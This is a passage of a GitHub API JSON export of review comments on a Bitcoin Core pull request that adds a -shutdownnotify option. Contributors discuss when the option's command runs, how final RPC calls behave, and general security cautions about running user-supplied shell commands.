         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744338532/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : "RIGHT",
      "updated_at" : "2021-11-08T00:04:03Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/744338532",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/49265907?v=4",
         "events_url" : "https://api.github.com/users/klementtan/events{/privacy}",
         "followers_url" : "https://api.github.com/users/klementtan/followers",
         "following_url" : "https://api.github.com/users/klementtan/following{/other_user}",
         "gists_url" : "https://api.github.com/users/klementtan/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/klementtan",
         "id" : 49265907,
         "login" : "klementtan",
         "node_id" : "MDQ6VXNlcjQ5MjY1OTA3",
         "organizations_url" : "https://api.github.com/users/klementtan/orgs",
         "received_events_url" : "https://api.github.com/users/klementtan/received_events",
         "repos_url" : "https://api.github.com/users/klementtan/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/klementtan/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/klementtan"
      }
   },
   {
      "author_association" : "MEMBER",
      "body" : "Not opposed to this but please don't mis-advertise it;\r\n\r\n> If users want to find out if it unexpectedly shut down, they will need to check for the absence of the notification and verify that the process is not running (e.g. writing state (utxo, wallet, ...) to the disk on shutdown).\r\n\r\nYes, there is no way to monitor for unexpected shutdowns from within bitcoind itself. This is theoretically and practically impossible no matter how hard you try. One way to do this is to tell the OS to receive notifications when the process dies, e.g. in Linux one can use `waitpid` on the PID from the PID file.",
      "created_at" : "2021-11-08T12:23:51Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-963100179",
      "id" : 963100179,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5845Z74T",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/963100179/reactions"
      },
      "updated_at" : "2021-11-08T12:23:51Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/963100179",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/126646?v=4",
         "events_url" : "https://api.github.com/users/laanwj/events{/privacy}",
         "followers_url" : "https://api.github.com/users/laanwj/followers",
         "following_url" : "https://api.github.com/users/laanwj/following{/other_user}",
         "gists_url" : "https://api.github.com/users/laanwj/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/laanwj",
         "id" : 126646,
         "login" : "laanwj",
         "node_id" : "MDQ6VXNlcjEyNjY0Ng==",
         "organizations_url" : "https://api.github.com/users/laanwj/orgs",
         "received_events_url" : "https://api.github.com/users/laanwj/received_events",
         "repos_url" : "https://api.github.com/users/laanwj/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/laanwj/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/laanwj/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/laanwj"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "> Yes, there is no way to monitor for unexpected shutdowns from within bitcoind itself.\r\n\r\n@laanwj thanks for the feedback and I totally agree with you. Updated the PR description to add a disclaimer that the command will not be executed if bitcoind unexpectedly shuts down. ",
      "created_at" : "2021-11-08T16:49:44Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-963357070",
      "id" : 963357070,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5845a6mO",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/963357070/reactions"
      },
      "updated_at" : "2021-11-08T16:49:44Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/963357070",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/49265907?v=4",
         "events_url" : "https://api.github.com/users/klementtan/events{/privacy}",
         "followers_url" : "https://api.github.com/users/klementtan/followers",
         "following_url" : "https://api.github.com/users/klementtan/following{/other_user}",
         "gists_url" : "https://api.github.com/users/klementtan/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/klementtan",
         "id" : 49265907,
         "login" : "klementtan",
         "node_id" : "MDQ6VXNlcjQ5MjY1OTA3",
         "organizations_url" : "https://api.github.com/users/klementtan/orgs",
         "received_events_url" : "https://api.github.com/users/klementtan/received_events",
         "repos_url" : "https://api.github.com/users/klementtan/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/klementtan/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/klementtan"
      }
   },
   {
      "author_association" : "CONTRIBUTOR",
      "body" : "@theStack thanks a lot for helping with testing and spotting this issue!\r\n\r\nThe reason why it returns `503` is because we call [`Interrupt(...)`](https://github.com/bitcoin/bitcoin/blob/master/src/init.cpp#L159) before [`Shutdown`](https://github.com/bitcoin/bitcoin/blob/master/src/init.cpp#L178) causing all RPC calls in `shutdownnotify` to fail.\r\nhttps://github.com/bitcoin/bitcoin/blob/f63bf05e73ea96e5c2c72cc455d05ad382883c27/src/bitcoind.cpp#L246-L247\r\n\r\na35f954 to 772a7a2: \r\n* Moved `ShutdownNotify` from `Shutdown` to `Interrupt` to allow for final RPC calls.\r\n\r\n<details> \r\n<summary> Making final RPC calls </summary>\r\n\r\nCommands:\r\n```\r\n$  ./src/bitcoind -signet -nolisten -noconnect -shutdownnotify=\"./src/bitcoin-cli -signet getblockchaininfo > tmp.txt\"\r\n$ ./src/bitcoin-cli stop\r\n$ cat tmp.txt\r\n```\r\n![image](https://user-images.githubusercontent.com/49265907/141186183-cbc6f82c-400d-4a8b-baba-27c0346c2c8a.png)\r\n</details>\r\n\r\n\r\n\r\n  \r\n",
      "created_at" : "2021-11-10T20:09:53Z",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-965705141",
      "id" : 965705141,
      "issue_url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/23395",
      "node_id" : "IC_kwDOABII5845j321",
      "performed_via_github_app" : null,
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/965705141/reactions"
      },
      "updated_at" : "2021-11-10T20:17:10Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/issues/comments/965705141",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/49265907?v=4",
         "events_url" : "https://api.github.com/users/klementtan/events{/privacy}",
         "followers_url" : "https://api.github.com/users/klementtan/followers",
         "following_url" : "https://api.github.com/users/klementtan/following{/other_user}",
         "gists_url" : "https://api.github.com/users/klementtan/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/klementtan",
         "id" : 49265907,
         "login" : "klementtan",
         "node_id" : "MDQ6VXNlcjQ5MjY1OTA3",
         "organizations_url" : "https://api.github.com/users/klementtan/orgs",
         "received_events_url" : "https://api.github.com/users/klementtan/received_events",
         "repos_url" : "https://api.github.com/users/klementtan/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/klementtan/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/klementtan"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747319588"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747319588"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "```suggestion\r\n\r\nNote: Restrict scripts and commands in the shell/system used for bitcoind to avoid running potentially unsafe scripts using `shutdownnotify`\r\n\r\n```\r\n\r\nContext: https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956356904\r\nMore info: https://github.com/bitcoin/bitcoin/issues/23412",
      "commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "created_at" : "2021-11-11T09:04:10Z",
      "diff_hunk" : "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The `shutdownnotify` option is used to specify a command to execute synchronously\n+before Bitcoin Core has begun its shutdown sequence. (#23395)\n+",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747319588",
      "id" : 747319588,
      "line" : 88,
      "node_id" : "PRRC_kwDOABII584sizEk",
      "original_commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "original_line" : 88,
      "original_position" : 6,
      "original_start_line" : null,
      "path" : "doc/release-notes.md",
      "position" : 6,
      "pull_request_review_id" : 803558840,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747319588/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-11T09:04:10Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747319588",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/13405205?v=4",
         "events_url" : "https://api.github.com/users/prayank23/events{/privacy}",
         "followers_url" : "https://api.github.com/users/prayank23/followers",
         "following_url" : "https://api.github.com/users/prayank23/following{/other_user}",
         "gists_url" : "https://api.github.com/users/prayank23/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/prayank23",
         "id" : 13405205,
         "login" : "prayank23",
         "node_id" : "MDQ6VXNlcjEzNDA1MjA1",
         "organizations_url" : "https://api.github.com/users/prayank23/orgs",
         "received_events_url" : "https://api.github.com/users/prayank23/received_events",
         "repos_url" : "https://api.github.com/users/prayank23/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/prayank23/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/prayank23"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747321697"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747321697"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "Is it possible to Restrict `runCommand` so that it will use only local resources and network?",
      "commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "created_at" : "2021-11-11T09:07:14Z",
      "diff_hunk" : "@@ -155,8 +155,24 @@ static fs::path GetPidFile(const ArgsManager& args)\n // shutdown thing.\n //\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::vector<std::thread> threads;\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        threads.emplace_back(runCommand, cmd);",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747321697",
      "id" : 747321697,
      "line" : 163,
      "node_id" : "PRRC_kwDOABII584sizlh",
      "original_commit_id" : "46790135b949e9f7aae3af02ba9e63b7c3bcac62",
      "original_line" : 163,
      "original_position" : 9,
      "original_start_line" : null,
      "path" : "src/init.cpp",
      "position" : 9,
      "pull_request_review_id" : 803561799,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747321697/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-11T09:07:14Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747321697",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/13405205?v=4",
         "events_url" : "https://api.github.com/users/prayank23/events{/privacy}",
         "followers_url" : "https://api.github.com/users/prayank23/followers",
         "following_url" : "https://api.github.com/users/prayank23/following{/other_user}",
         "gists_url" : "https://api.github.com/users/prayank23/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/prayank23",
         "id" : 13405205,
         "login" : "prayank23",
         "node_id" : "MDQ6VXNlcjEzNDA1MjA1",
         "organizations_url" : "https://api.github.com/users/prayank23/orgs",
         "received_events_url" : "https://api.github.com/users/prayank23/received_events",
         "repos_url" : "https://api.github.com/users/prayank23/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/prayank23/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/prayank23"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747465714"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747465714"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "Would it be better to add this to the end of all `-*notify`'s help option since this *note* applies to all of them?",
      "commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "created_at" : "2021-11-11T12:39:49Z",
      "diff_hunk" : "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The `shutdownnotify` option is used to specify a command to execute synchronously\n+before Bitcoin Core has begun its shutdown sequence. (#23395)\n+",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747465714",
      "id" : 747465714,
      "in_reply_to_id" : 747319588,
      "line" : 88,
      "node_id" : "PRRC_kwDOABII584sjWvy",
      "original_commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "original_line" : 88,
      "original_position" : 6,
      "original_start_line" : null,
      "path" : "doc/release-notes.md",
      "position" : 6,
      "pull_request_review_id" : 803751647,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747465714/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-11T12:39:49Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747465714",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/49265907?v=4",
         "events_url" : "https://api.github.com/users/klementtan/events{/privacy}",
         "followers_url" : "https://api.github.com/users/klementtan/followers",
         "following_url" : "https://api.github.com/users/klementtan/following{/other_user}",
         "gists_url" : "https://api.github.com/users/klementtan/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/klementtan",
         "id" : 49265907,
         "login" : "klementtan",
         "node_id" : "MDQ6VXNlcjQ5MjY1OTA3",
         "organizations_url" : "https://api.github.com/users/klementtan/orgs",
         "received_events_url" : "https://api.github.com/users/klementtan/received_events",
         "repos_url" : "https://api.github.com/users/klementtan/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/klementtan/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/klementtan"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747479599"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747479599"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "Do you mean we should restrict all shell commands to only interact with localhost (ie do not allow curl calls to any external hosts)? Apart from performing some sort of validation on the string provided for the option, I am unaware of any technique to enforce this. Do you have any suggestions? ",
      "commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "created_at" : "2021-11-11T13:00:50Z",
      "diff_hunk" : "@@ -155,8 +155,24 @@ static fs::path GetPidFile(const ArgsManager& args)\n // shutdown thing.\n //\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::vector<std::thread> threads;\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        threads.emplace_back(runCommand, cmd);",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747479599",
      "id" : 747479599,
      "in_reply_to_id" : 747321697,
      "line" : 163,
      "node_id" : "PRRC_kwDOABII584sjaIv",
      "original_commit_id" : "46790135b949e9f7aae3af02ba9e63b7c3bcac62",
      "original_line" : 163,
      "original_position" : 9,
      "original_start_line" : null,
      "path" : "src/init.cpp",
      "position" : 9,
      "pull_request_review_id" : 803769859,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747479599/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-11T13:00:50Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747479599",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/49265907?v=4",
         "events_url" : "https://api.github.com/users/klementtan/events{/privacy}",
         "followers_url" : "https://api.github.com/users/klementtan/followers",
         "following_url" : "https://api.github.com/users/klementtan/following{/other_user}",
         "gists_url" : "https://api.github.com/users/klementtan/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/klementtan",
         "id" : 49265907,
         "login" : "klementtan",
         "node_id" : "MDQ6VXNlcjQ5MjY1OTA3",
         "organizations_url" : "https://api.github.com/users/klementtan/orgs",
         "received_events_url" : "https://api.github.com/users/klementtan/received_events",
         "repos_url" : "https://api.github.com/users/klementtan/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/klementtan/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/klementtan/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/klementtan"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747492659"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747492659"
         }
      },
      "author_association" : "MEMBER",
      "body" : "As I mentioned earlier, this is unrelated to this pull and might be best discussed in another issue/pull for *all* notify commands. https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956356904",
      "commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "created_at" : "2021-11-11T13:19:57Z",
      "diff_hunk" : "@@ -155,8 +155,24 @@ static fs::path GetPidFile(const ArgsManager& args)\n // shutdown thing.\n //\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::vector<std::thread> threads;\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        threads.emplace_back(runCommand, cmd);",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747492659",
      "id" : 747492659,
      "in_reply_to_id" : 747321697,
      "line" : 163,
      "node_id" : "PRRC_kwDOABII584sjdUz",
      "original_commit_id" : "46790135b949e9f7aae3af02ba9e63b7c3bcac62",
      "original_line" : 163,
      "original_position" : 9,
      "original_start_line" : null,
      "path" : "src/init.cpp",
      "position" : 9,
      "pull_request_review_id" : 803787391,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747492659/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-11T13:19:57Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747492659",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/6399679?v=4",
         "events_url" : "https://api.github.com/users/MarcoFalke/events{/privacy}",
         "followers_url" : "https://api.github.com/users/MarcoFalke/followers",
         "following_url" : "https://api.github.com/users/MarcoFalke/following{/other_user}",
         "gists_url" : "https://api.github.com/users/MarcoFalke/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/MarcoFalke",
         "id" : 6399679,
         "login" : "MarcoFalke",
         "node_id" : "MDQ6VXNlcjYzOTk2Nzk=",
         "organizations_url" : "https://api.github.com/users/MarcoFalke/orgs",
         "received_events_url" : "https://api.github.com/users/MarcoFalke/received_events",
         "repos_url" : "https://api.github.com/users/MarcoFalke/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/MarcoFalke/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/MarcoFalke/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/MarcoFalke"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747492863"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747492863"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "Maybe. Not sure. Or we can add in both places. I tried to share few alternatives but if none of them look good, we should at least document related security recommendations.",
      "commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "created_at" : "2021-11-11T13:20:12Z",
      "diff_hunk" : "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The `shutdownnotify` option is used to specify a command to execute synchronously\n+before Bitcoin Core has begun its shutdown sequence. (#23395)\n+",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747492863",
      "id" : 747492863,
      "in_reply_to_id" : 747319588,
      "line" : 88,
      "node_id" : "PRRC_kwDOABII584sjdX_",
      "original_commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "original_line" : 88,
      "original_position" : 6,
      "original_start_line" : null,
      "path" : "doc/release-notes.md",
      "position" : 6,
      "pull_request_review_id" : 803787635,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747492863/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-11T13:20:13Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747492863",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/13405205?v=4",
         "events_url" : "https://api.github.com/users/prayank23/events{/privacy}",
         "followers_url" : "https://api.github.com/users/prayank23/followers",
         "following_url" : "https://api.github.com/users/prayank23/following{/other_user}",
         "gists_url" : "https://api.github.com/users/prayank23/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/prayank23",
         "id" : 13405205,
         "login" : "prayank23",
         "node_id" : "MDQ6VXNlcjEzNDA1MjA1",
         "organizations_url" : "https://api.github.com/users/prayank23/orgs",
         "received_events_url" : "https://api.github.com/users/prayank23/received_events",
         "repos_url" : "https://api.github.com/users/prayank23/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/prayank23/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/prayank23"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747494328"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747494328"
         }
      },
      "author_association" : "CONTRIBUTOR",
      "body" : "Yes because attackers can't do much if requests only work for localhost. I will ask in few subreddits and see if there are any ways to achieve this.",
      "commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "created_at" : "2021-11-11T13:22:14Z",
      "diff_hunk" : "@@ -155,8 +155,24 @@ static fs::path GetPidFile(const ArgsManager& args)\n // shutdown thing.\n //\n \n+#if HAVE_SYSTEM\n+static void ShutdownNotify(const ArgsManager& args)\n+{\n+    std::vector<std::thread> threads;\n+    for (const auto& cmd : args.GetArgs(\"-shutdownnotify\")) {\n+        threads.emplace_back(runCommand, cmd);",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747494328",
      "id" : 747494328,
      "in_reply_to_id" : 747321697,
      "line" : 163,
      "node_id" : "PRRC_kwDOABII584sjdu4",
      "original_commit_id" : "46790135b949e9f7aae3af02ba9e63b7c3bcac62",
      "original_line" : 163,
      "original_position" : 9,
      "original_start_line" : null,
      "path" : "src/init.cpp",
      "position" : 9,
      "pull_request_review_id" : 803789540,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
         "-1" : 0,
         "confused" : 0,
         "eyes" : 0,
         "heart" : 0,
         "hooray" : 0,
         "laugh" : 0,
         "rocket" : 0,
         "total_count" : 0,
         "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747494328/reactions"
      },
      "side" : "RIGHT",
      "start_line" : null,
      "start_side" : null,
      "updated_at" : "2021-11-11T13:22:14Z",
      "url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747494328",
      "user" : {
         "avatar_url" : "https://avatars.githubusercontent.com/u/13405205?v=4",
         "events_url" : "https://api.github.com/users/prayank23/events{/privacy}",
         "followers_url" : "https://api.github.com/users/prayank23/followers",
         "following_url" : "https://api.github.com/users/prayank23/following{/other_user}",
         "gists_url" : "https://api.github.com/users/prayank23/gists{/gist_id}",
         "gravatar_id" : "",
         "html_url" : "https://github.com/prayank23",
         "id" : 13405205,
         "login" : "prayank23",
         "node_id" : "MDQ6VXNlcjEzNDA1MjA1",
         "organizations_url" : "https://api.github.com/users/prayank23/orgs",
         "received_events_url" : "https://api.github.com/users/prayank23/received_events",
         "repos_url" : "https://api.github.com/users/prayank23/repos",
         "site_admin" : false,
         "starred_url" : "https://api.github.com/users/prayank23/starred{/owner}{/repo}",
         "subscriptions_url" : "https://api.github.com/users/prayank23/subscriptions",
         "type" : "User",
         "url" : "https://api.github.com/users/prayank23"
      }
   },
   {
      "_links" : {
         "html" : {
            "href" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747494960"
         },
         "pull_request" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395"
         },
         "self" : {
            "href" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/comments/747494960"
         }
      },
      "author_association" : "MEMBER",
      "body" : "The release notes are not the right place to put extended documentation in any case. The RPC docs, the manpage, or the docs folder are more appropriate. Also: https://github.com/bitcoin/bitcoin/pull/23395#issuecomment-956356904",
      "commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "created_at" : "2021-11-11T13:23:06Z",
      "diff_hunk" : "@@ -83,6 +83,9 @@ Files\n New settings\n ------------\n \n+- The `shutdownnotify` option is used to specify a command to execute synchronously\n+before Bitcoin Core has begun its shutdown sequence. (#23395)\n+",
      "html_url" : "https://github.com/bitcoin/bitcoin/pull/23395#discussion_r747494960",
      "id" : 747494960,
      "in_reply_to_id" : 747319588,
      "line" : 88,
      "node_id" : "PRRC_kwDOABII584sjd4w",
      "original_commit_id" : "772a7a2fe9c88ac23608333959ee7df65e61e4c0",
      "original_line" : 88,
      "original_position" : 6,
      "original_start_line" : null,
      "path" : "doc/release-notes.md",
      "position" : 6,
      "pull_request_review_id" : 803790300,
      "pull_request_url" : "https://api.github.com/repos/bitcoin/bitcoin/pulls/23395",
      "reactions" : {
         "+1" : 0,
